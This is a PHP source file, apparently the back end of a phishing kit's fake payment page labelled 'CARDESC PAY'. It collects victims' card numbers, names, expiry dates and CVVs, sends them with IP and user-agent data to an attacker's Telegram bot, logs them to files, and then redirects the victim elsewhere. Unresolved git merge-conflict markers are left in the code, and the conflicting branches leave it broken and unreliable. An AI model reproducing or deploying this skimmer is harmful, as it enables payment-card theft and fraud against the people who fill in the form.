<?php

// Securely fetch and sanitize input
function get_post_input($key, $default = "") {
    $val = $_POST[$key] ?? $default;
    return htmlspecialchars(strip_tags(trim($val)), ENT_QUOTES, "UTF-8");
}

$creditcard_number = get_post_input("creditcard_number");
$creditcard_name = get_post_input("creditcard_name");
$exp_month = filter_input(INPUT_POST, "month", FILTER_SANITIZE_NUMBER_INT) ?: 0;
$exp_year = filter_input(INPUT_POST, "year", FILTER_SANITIZE_NUMBER_INT) ?: 0;
$cvc = filter_input(INPUT_POST, "cvc", FILTER_SANITIZE_NUMBER_INT) ?: 0;

$user_agent = $_SERVER["HTTP_USER_AGENT"] ?? "Unknown";
$ip = $_SERVER["HTTP_X_FORWARDED_FOR"] ?? $_SERVER["REMOTE_ADDR"] ?? "Unknown";
$expiration = sprintf("%02d/%d", $exp_month, $exp_year);

// Define file paths
$root_dir = $_SERVER["DOCUMENT_ROOT"];
$details_dir = $root_dir . DIRECTORY_SEPARATOR . "details";
$settings_file = $details_dir . DIRECTORY_SEPARATOR . "settings.json";
$log_file = $details_dir . DIRECTORY_SEPARATOR . "log.log";
$result_file = dirname($root_dir) . DIRECTORY_SEPARATOR . "result.log";

$send_to_bot = false;

function isValidUrl($url) {
    return filter_var($url, FILTER_VALIDATE_URL) !== false;
}

// Handle Telegram Notification
if (file_exists($settings_file)) {
    $config = json_decode(file_get_contents($settings_file), true);

<<<<<<< HEAD
    if ($config && !empty($config['bot_api']) && !empty($config['chat_id'])) {
        $send_to_bot = true;
        
=======
    if ($config && !empty($config["bot_api"]) && !empty($config["chat_id"])) {
>>>>>>> b3de8a5 (upd v2.0.0)
        $message = sprintf(
            "💳 CARDESC PAY\n" .
            " • Card Name: %s\n" .
            " • Card Number: %s\n" .
            " • Date: %s\n" .
            " • CVV: %s\n\n" .
            "📟 Details\n" .
            " • IP: %s\n" .
            " • User-Agent: %s",
            $creditcard_name, $creditcard_number, $expiration, $cvc, $ip, $user_agent
        );

        $api_url = "https://api.telegram.org/bot{$config['bot_api']}/sendMessage";
<<<<<<< HEAD
        $params = http_build_query([
            'chat_id' => $config['chat_id'],
            'text' => $message
        ]);
=======
        
        $post_data = [
            "chat_id" => $config["chat_id"],
            "text"    => $message
        ];
>>>>>>> b3de8a5 (upd v2.0.0)

        $context = stream_context_create([
            "http" => [
                "timeout" => 5,
                "method"  => "POST",
                "header"  => "Content-Type: application/x-www-form-urlencoded\r\n",
                "content" => http_build_query($post_data)
            ]
        ]);

        $response = @file_get_contents($api_url, false, $context);
        
        if ($response !== false) {
            $result = json_decode($response, true);
            $send_to_bot = ($result && isset($result["ok"]) && $result["ok"] === true);
        }
    }
}

// Log results (Internal JSON log for Python monitor)
$log_raw = [
    "type"   => "PAY",
    "name"   => $creditcard_name,
    "number" => $creditcard_number,
    "date"   => $expiration,
    "cvv"    => $cvc,
    "ip"     => $ip,
    "sent"   => $send_to_bot
];

file_put_contents($log_file, json_encode($log_raw) . "\n", FILE_APPEND | LOCK_EX);

// Log results (Human-readable result log)
$result_entry = sprintf(
    "[%s] Name: %s | Number: %s | Date: %s | CVV2: %s | Sent: %s | IP: %s\n",
    date("Y-m-d H:i:s"), $creditcard_name, $creditcard_number, $expiration, $cvc, 
    $send_to_bot ? "true" : "false", $ip
);
file_put_contents($result_file, $result_entry, FILE_APPEND | LOCK_EX);

// Determine redirect URL
$loc_file = $details_dir . DIRECTORY_SEPARATOR . "location.location";
$redirect_url = "https://google.com";

if (file_exists($loc_file)) {
    $content = trim(file_get_contents($loc_file));
    if (isValidUrl($content)) {
        $redirect_url = $content;
    }
}

?>
<script>
    window.location.href = <?php echo json_encode($redirect_url); ?>;
</script>
